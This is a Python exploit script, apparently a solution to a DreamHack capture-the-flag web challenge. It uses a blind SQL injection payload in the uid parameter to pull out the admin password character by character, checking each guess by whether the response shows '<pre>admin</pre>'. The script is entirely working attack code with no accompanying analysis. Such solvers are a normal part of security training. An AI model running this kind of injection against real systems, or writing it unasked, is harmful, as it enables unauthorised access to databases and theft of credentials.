import requests
import string

url = "http://host8.dreamhack.games:12857/"
password = ""
# DreamHack 플래그에 사용될 문자들
charset = string.ascii_letters + string.digits + "{}!@#$%^&*()_-+=<>?/"

for i in range(1, 44):  # 43글자
    found = False
    for c in charset:
        hex_char = '0x' + c.encode().hex()
        # params 사용하지 않고 직접 URL 구성 (이중 인코딩 방지)
        payload = f"'||(uid=0x61646d696e)%26%26(substr(upw,{i},1)={hex_char})%23"
        full_url = f"{url}?uid={payload}"
        
        r = requests.get(full_url)
        
        # 안전한 방식으로 'admin' 확인
        if '<pre>admin</pre>' in r.text:
            password += c
            print(f"[+] ({i}/43) Found: {password}")
            found = True
            break
    
    if not found:
        print(f"[-] Position {i}: not found, trying more chars...")
        # 못 찾은 경우 대비
        password += "?"
        print(f"[?] Current: {password}")

print(f"\n[+] Final password: {password}")